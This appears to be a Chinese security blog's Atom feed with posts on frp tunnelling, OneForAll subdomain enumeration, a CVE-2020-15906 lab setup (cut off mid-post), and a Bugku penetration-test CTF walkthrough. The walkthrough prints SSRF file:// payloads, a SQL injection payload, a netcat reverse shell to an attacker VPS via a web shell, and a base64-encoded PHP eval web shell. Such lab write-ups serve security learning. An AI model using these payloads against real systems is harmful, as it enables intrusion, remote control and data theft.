<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S1ient</title>
  
  <subtitle>....</subtitle>
  <link href="https://s1ient.github.io/atom.xml" rel="self"/>
  
  <link href="https://s1ient.github.io/"/>
  <updated>2023-05-14T16:03:35.051Z</updated>
  <id>https://s1ient.github.io/</id>
  
  <author>
    <name>S1ient</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>frp 使用</title>
    <link href="https://s1ient.github.io/post/c3d53602.html"/>
    <id>https://s1ient.github.io/post/c3d53602.html</id>
    <published>2023-05-14T15:25:05.000Z</published>
    <updated>2023-05-14T16:03:35.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><ul><li>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。</li><li>可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</li></ul><p>下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wegt https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>解压之后里面主要有两个名字的的文件，frpc 和 frps，其中 frpc 是在 客户端使用的，frps 则是在服务端使用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frpc客户端程序 </span><br><span class="line">frpc_full.ini客户端完整配置文件 </span><br><span class="line">frpc.ini客户端简易配置文件 </span><br><span class="line">frps服务端程序 </span><br><span class="line">frps_full.ini服务端完整配置文件 </span><br><span class="line">frps.ini服务端简易配置文件</span><br></pre></td></tr></table></figure><ul><li>将其中的 frpc 拷贝到内网服务所在的机器上，</li><li>将 frps 拷贝到具有公网 IP 的机器上</li></ul><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在使用前我们要先对 ini 文件进行 配置</p><p><strong>frps 服务端配置</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment">#bind_port是服务端与客户端之间通信使用的端口号</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面都不是必须的，如果只是自己做实验为了省事，可以不写</span></span><br><span class="line"><span class="comment">#与客户端的token必须设置成一致,token用于验证连接，只有服务端和客户端token相同的时候才能正常访问。如果不使用token，那么所有人都可以直接连接上</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">123456</span></span><br><span class="line"><span class="comment">#转发web服务</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">6555</span></span><br><span class="line"><span class="comment">#开启仪表板</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">6556</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin</span><br><span class="line"></span><br><span class="line"><span class="attr">tcp_mux</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">max_pool_count</span> = <span class="number">10</span></span><br></pre></td></tr></table></figure><p><strong>frpc 客户端配置</strong></p><p>其实看你需要什么就写什么，[common] 是必须的，这个很多和  frpc 是一一对应的</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment">#服务器ip</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">1.2</span>.<span class="number">3.4</span></span><br><span class="line"><span class="comment">#服务端与客户端之间通信使用的端口号，要与上面的一致</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment">#与服务端的token必须设置成一致</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[lo80]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">16000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">16005</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"></span><br><span class="line"><span class="comment">#MySQL 数据库</span></span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">3306</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">3306</span></span><br><span class="line"><span class="attr">custom_domains</span> = <span class="number">1.2</span>.<span class="number">3.4</span> <span class="comment">#你的 frp 的 server 的 ip</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Redis 数据库</span></span><br><span class="line"><span class="section">[redis]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">6379</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6379</span></span><br><span class="line"><span class="attr">custom_domains</span> = <span class="number">1.2</span>.<span class="number">3.4</span> <span class="comment">#你的 frp 的 server 的 ip 或域名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#本地服务 1</span></span><br><span class="line"><span class="section">[web1]</span></span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="comment">#本地端口 1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">9090</span></span><br><span class="line"><span class="attr">custom_domains</span> = aa.bb.cn</span><br><span class="line"></span><br><span class="line"><span class="comment">#本地服务2 gitlab 的传输类型是 tcp 而非 http</span></span><br><span class="line"><span class="section">[gitlab]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">3.220</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">9980</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">9980</span></span><br><span class="line"><span class="attr">custom_domains</span> = gitlab.xxx.xxx</span><br></pre></td></tr></table></figure><p>这里特别说明下 frp 下 web 服务的配置，以 web1 为例：假设 frp 服务器所在的 ip 为 1.2.3.4，绑定的域名为 aa.bb.cn,使用 Nginx 代理转发到 1.2.3.4:6555上，则 frpc 在配置 web1 时 <code>custom_domains</code> 必须设置成 aa.bb.cn【要和访问的域名完全一致，不含端口】，否则在输入 aa.bb.cn 访问时，会报 frp 给出的 404 错误。</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a><strong>运行</strong></h2><p>Linux 下启动 frps 服务端，在 frp 目录下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>启动后会将日志记录到 file.log 文件中</p><p>windows 下启动 frpc 客户端：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span> /b frpc.exe -c C:\\Users\\<span class="number">25189</span>\\Desktop\\frpc.ini</span><br></pre></td></tr></table></figure><p>注意 : 这里 ini 文件一定要是 &#x3D;&#x3D;绝对路径&#x3D;&#x3D; ！！！不能是相对路径， 要先启动 frps 再启动 frpc</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这玩意用起来很好用，看起来也不是很复杂，但还是要多去自己使用一下，我之前就是因为使用的是绝对路径导致一直不成功，卡了好久。</p><p>还有就是配置文件不要写错了，我之前因为懒直接复制别人的配置文件内容，结果都后面才发现我根本就没有开启那个端口，所以也是一直连接不上。</p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://frps.cn/11.html">Frp 官方文档介绍 – Frps.cn 中文文档</a></p><p><a href="https://blog.csdn.net/qq_41901122/article/details/121090452">FRP第一篇之FRP介绍和基本使用_星球守护者的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_36981760/article/details/115713179">FRP搭建内网穿透(亲测有效)_locyan frp_Freguez · duoyu的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HT</summary>
      
    
    
    
    
    <category term="tool" scheme="https://s1ient.github.io/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试3 Bugku</title>
    <link href="https://s1ient.github.io/post/17cccafb.html"/>
    <id>https://s1ient.github.io/post/17cccafb.html</id>
    <published>2023-05-07T11:38:26.000Z</published>
    <updated>2023-05-15T12:37:49.810Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/1.png" alt="1"></p><h1 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h1><p>进去是一个站点，标题是模拟蜘蛛爬取</p><p>随便输入一个网址就会跳转到那个网站</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/2.png" alt="2"></p><p>这种快照的网站一般都是存在 ssrf，ssrf 常用 url 伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:///    从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict://     字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp://     SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap://     轻量级目录访问协议</span><br><span class="line">tftp://     简单文件传输协议</span><br><span class="line">gopher://   分布式文档传递服务，可使用 gopherus 生成 payload</span><br></pre></td></tr></table></figure><p>输入直接获取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///flag</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/3.png" alt="3"></p><h1 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h1><p>题目提示：看看内网以及被黑客入侵过</p><p>所以先看看 <code>etc/hosts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br></pre></td></tr></table></figure><p>发现了 192.168.0.2 </p><p>!<img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/4.png" alt="4"></p><p>对其进行提交没有反应，所以用 bp 进行爆破</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/5.png" alt="5"></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/6.png" alt="6"></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/7.png" alt="7"></p><p>最后发现 192.168.0.10 和 192.168.0.138 和 192.168.0.250 有问题</p><p>先看 192.168.0.10，发现了网站杯被葫芦娃黑了，根据提示看来是我们想要的</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/8.png" alt="8"></p><p>被黑就会有 webshell，一般是 php，再次进行爆破找到了 shell.php</p><p>是一个命令执行</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/9.png" alt="9"></p><p>直接 <code>ls</code> 得到 flag 位置，<code>cat flag</code> 就可以得到 flag 了</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/10.png" alt="10"></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/11.png" alt="11"></p><h1 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h1><p>这里 <code>ls /</code>查看根目录也找到了一个 flag</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/15.png" alt="15"></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/16.png" alt="16"></p><h1 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h1><p>上一个场景我们还得到了 192.168.0.138，发现是一个典型的 sql 注入</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/12.png" alt="12"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.138?id=100%20union%20select%201,2,3,(select%20*%20from%20bugku_sql.flag)--+</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/13.png" alt="13"></p><h1 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h1><p>由于是内网，所以有进行内网穿透的想法，所以去寻找我们可以利用的软件 nc，frp 等等</p><p>这里找到了 nc，可以利用 nc 进行反弹 shell</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/17.png" alt="17"></p><p>我们先利用 wegt 下载 frp 工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.10/shell.php?cmd=wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz</span><br><span class="line">192.168.0.10/shell.php?cmd=tar -xvf frp_0.48.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>自己的 VPS 监听端口 <code>nc -lvvp port</code></p><p>同时访问：<code>192.168.0.10/shell.php?cmd=nc xx.xx.xx.xx port -e /bin/sh</code></p><p>xx.xx.xxx.xx 是你的 vps 的 ip， port 是你的 vps 开放的端口</p><p>连接成功</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/18.png" alt="18"></p><p>进入文件夹，利用 echo 修改 frpc.ini </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;[common]&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;server_addr = 106.55.226.242&#x27; &gt;&gt; frpc.ini   你自己的 vps ip</span><br><span class="line">echo &#x27;server_port = 7000&#x27; &gt;&gt; frpc.ini</span><br><span class="line"></span><br><span class="line">echo &#x27;[socks5]&#x27;&gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;type = tcp &#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;remote_port = 7001&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;plugin = socks5&#x27; &gt;&gt; frpc.ini</span><br></pre></td></tr></table></figure><p>赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomod 777 frpc</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ~/frp_0.48.0_linux_amd64/frps.ini  vps 先启动</span><br><span class="line">./frpc -c /var/www/html/frp_0.48.0_linux_amd64/frpc.ini  靶机后启动,注意 -c 指的是 ini 文件的绝对路径</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/19.png" alt="19"></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/20.png" alt="20"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=echo &quot;PD9waHAgZXZhbCgkX1BPU1RbczFlbnRdKTs/Pg==&quot;|base64 -d&gt; s.php</span><br><span class="line">&lt;?php eval($_POST[s1ent]);?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;场景一&quot;&gt;&lt;a href=&quot;#场景一&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="-渗透测试" scheme="https://s1ient.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>OneForAll 使用教程</title>
    <link href="https://s1ient.github.io/post/61f481ec.html"/>
    <id>https://s1ient.github.io/post/61f481ec.html</id>
    <published>2023-03-26T08:47:40.000Z</published>
    <updated>2023-05-14T15:21:29.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>OneForAll 是一款集百家之长，收集能力强大、支持子域爆破、验证、爬取、置换、接管、处理功能强大、速度极快、体验良好的子域收集工具。</p><blockquote><ul><li>收集能力强大，利用证书透明度收集子域、常规检查收集子域、利用网上爬虫档案收集子域、利用DNS数据集收集子域、利用DNS查询收集子域、利用威胁情报平台数据收集子域、利用搜索引擎发现子域，在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索，全量搜索，递归搜索。</li><li>支持子域爆破，该模块有常规的字典爆破，也有自定义的fuzz模式，支持批量爆破和递归爆破，自动判断泛解析并处理。</li><li>支持子域验证，默认开启子域验证，自动解析子域 DNS，自动请求子域获取 title 和 banner，并综合判断子域存活情况。</li><li>支持子域爬取，根据已有的子域，请求子域响应体以及响应体里的JS，从中再次发现新的子域。</li><li>支持子域置换，根据已有的子域，使用子域替换技术再次发现新的子域。</li><li>支持子域接管，默认开启子域接管风险检查，支持子域自动接管（目前只有 Github，有待完善），支持批量检查。</li><li>处理功能强大，发现的子域结果支持自动去除，自动 DNS 解析，HTTP 请求探测，自动筛选出有效子域，拓展子域的Banner信息，最终支持的导出格式有 txt, csv, json。</li><li>体验良好，各模块都有进度条，异步保存各模块结果。</li></ul></blockquote><p>OneForAll 是基于 CPython 开发的，所以需要 Python3 环境才能运行</p><p>项目地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure><p>git 安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/shmilylty/OneForAll.git &amp;&amp; cd OneForAll/</span><br></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure><h1 id="0x02-语法"><a href="#0x02-语法" class="headerlink" title="0x02 语法"></a>0x02 语法</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oneforall.py [选项] run</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">选项</th><th align="left">注释</th></tr></thead><tbody><tr><td align="left">–target</td><td align="left">目标URL</td></tr><tr><td align="left">–brute&#x3D;</td><td align="left">使用爆破模块，默认 False</td></tr><tr><td align="left">–dns&#x3D;</td><td align="left">DNS解析子域，默认 True</td></tr><tr><td align="left">–req&#x3D;</td><td align="left">HTTP请求子域，默认 True</td></tr><tr><td align="left">–port&#x3D;</td><td align="left">请求验证子域的端口范围，默认 80 端口</td></tr><tr><td align="left">–valid&#x3D;</td><td align="left">只导出存活的子域结果，默认 False</td></tr><tr><td align="left">–format&#x3D;</td><td align="left">结果保存格式，默认 csv</td></tr><tr><td align="left">–path&#x3D;</td><td align="left">结果保存路径</td></tr><tr><td align="left">–takeover&#x3D;</td><td align="left">检查子域接管，默认 False</td></tr></tbody></table><h1 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h1><p>扫描单个域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target example.com run</span><br></pre></td></tr></table></figure><p>扫描多域，先把域名放在 url.txt 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --targets url.txt run</span><br></pre></td></tr></table></figure><p>结果会保存在 <code>results/</code> 目录下，在运行结果中我们可以看到有 URL、子域名、IP等信息</p><p>其中运行结果中 ip 是一行多个、还有重复的，我们需要提取ip转换成每行一个 ip 且没有重复的 txt 文本中，方便其他工具扫描</p><p>脚本：删除重复 IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># conding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把同一行的ip换行,然后写进result.txt的文件里</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> readlist:</span><br><span class="line">    <span class="keyword">for</span> dirs <span class="keyword">in</span> readlist.readlines():</span><br><span class="line">         <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> writelist:</span><br><span class="line">             b = dirs.replace(<span class="string">&quot;,&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">             writelist.write(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除重复ip，然后把结果写进only.txt文件里</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> readlist:</span><br><span class="line">    lines_seen = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> readlist.readlines():</span><br><span class="line">        <span class="keyword">if</span> line <span class="keyword">not</span> <span class="keyword">in</span> lines_seen:</span><br><span class="line">            lines_seen.add(line)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;only.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> writelist:</span><br><span class="line">                writelist.write(line)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h1&gt;&lt;p&gt;OneForAll 是一款集百家之长，收集能力强大、支持子域爆破、验证、爬取、置换、接管、处理功能强</summary>
      
    
    
    
    
    <category term="tool" scheme="https://s1ient.github.io/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-15906</title>
    <link href="https://s1ient.github.io/post/56b8d0cc.html"/>
    <id>https://s1ient.github.io/post/56b8d0cc.html</id>
    <published>2023-03-24T11:02:17.000Z</published>
    <updated>2023-05-10T05:57:59.641Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tikiwiki"><a href="#tikiwiki" class="headerlink" title="tikiwiki"></a>tikiwiki</h1><h2 id="CVE-2020-15906"><a href="#CVE-2020-15906" class="headerlink" title="CVE-2020-15906"></a>CVE-2020-15906</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Tiki Wiki CMS Groupware 或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。</p><p>在如下这些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。</p><h3 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h3><blockquote><p>Tiki Tiki  &lt; 21.2</p></blockquote><h3 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h3><blockquote><p>vulhub&#x2F;tikiwiki&#x2F;CVE-2020-15906</p><p>kali</p></blockquote><p><strong>利用 poc</strong></p><blockquote><p><a href="https://srcincite.io/pocs/cve-2021-26119.py.txt">https://srcincite.io/pocs/cve-2021-26119.py.txt</a></p></blockquote><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> /root/vulhub/tikiwiki/CVE-2020-15906</span><br><span class="line"><span class="comment"># 对靶场进行编译</span></span><br><span class="line">docker-compose build</span><br><span class="line"><span class="comment"># 运行靶场</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment"># 查看运行的端口</span></span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure><p>访问你的 ip:8080 ,进入首页</p><p><img src="/../image/CVE-2020-15906/1.png" alt="1"></p><p>访问 <code>changelog.txt</code>获得 tiki 版本为 <code>21.0</code></p><p><img src="/../image/CVE-2020-15906/2.png" alt="2"></p><p>用 <code>searchsploit</code>搜索相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Tiki 